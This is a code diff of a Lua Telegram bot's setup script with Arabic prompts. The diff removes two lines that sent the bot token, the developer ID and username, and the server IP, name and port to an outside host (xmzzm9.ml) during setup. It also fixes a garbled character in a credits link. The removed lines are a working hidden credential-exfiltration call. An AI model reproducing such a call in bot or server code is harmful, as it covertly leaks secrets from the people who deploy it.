@@ -42,7 +42,6 @@ local SUDOID = io.read()
 if SUDOID ~= '' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
-local t = json:decode(https.request('https://xmzzm9.ml/MaRcoSTeAm/index.php?n=MARCOS&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..database:get(id_server..":SUDO:USERNAME").."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 else
 print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
@@ -54,7 +53,6 @@ local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
 database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
-local t = json:decode(https.request('https://xmzzm9.ml/MaRcoSTeAm/index.php?n=MARCOS&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..database:get(id_server..":SUDO:USERNAME").."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
@@ -2439,7 +2437,7 @@ if text == 'مطور السورس' or text == 'اريد مطور السورس' o
 Text = [[
 ᯓ┇𝙈𝘼𝙍𝘾𝙊𝙎 𝙏𝙀𝘼𝙈  🦅
 … … … … … … … … … … …
-ᯓ┇↬ [𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐄𝐕𝐄𝐋??𝐏𝐄𝐑](t.me/Ra_m9)
+ᯓ┇↬ [𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑](t.me/Ra_m9)
 
 ᯓ┇↬ [𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓](t.me/R9Dbot)
 ]]
